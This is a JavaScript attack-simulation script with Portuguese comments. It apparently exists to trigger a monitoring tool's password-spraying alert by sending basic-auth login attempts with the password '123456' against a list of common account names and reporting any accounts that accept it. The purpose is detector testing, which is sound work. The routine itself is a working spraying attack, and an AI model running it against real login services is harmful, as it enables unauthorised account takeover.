// npm run ataque:spraying: um IP tentando a mesma senha fraca em muitas
// contas, para não travar nenhuma. O Omni acusa "Contas diferentes testadas
// por IP (password spraying)" (5/min amarelo, 10/min vermelho).
//   --senha 123456
//   --taxa 2
//   --duracao 90s

import { args, basic, flood, seconds, send } from '../lib.js'

const o = args({ senha: '123456', taxa: 2, duracao: '90s' })
const ip = '198.51.100.23'
const contas = ['ana', 'bia', 'carlos', 'davi', 'elis', 'admin', 'root', 'suporte', 'financeiro', 'joao', 'maria', 'pedro', 'lucas', 'julia', 'teste', 'contato', 'vendas', 'ti']
const found = new Set()

console.log(`password spraying: senha "${o.senha}" em ${contas.length} contas, de ${ip}. Ctrl+C para parar.`)
await flood({
  name: 'spraying',
  rate: o.taxa,
  duration: seconds(o.duracao),
  next: (i) => {
    const conta = contas[i % contas.length]
    return send('/api/entrar', { method: 'POST', ip, auth: basic(conta, o.senha) }).then((r) => ({ ...r, conta }))
  },
  onResult: (r) => {
    if (r.status === 200 && !found.has(r.conta)) {
      found.add(r.conta)
      console.log(`  CONTA INVADIDA: ${r.conta} / ${o.senha}`)
    }
  },
})
console.log(found.size ? `\ncontas com a senha "${o.senha}": ${[...found].join(', ')}` : '\nnenhuma conta usa essa senha')
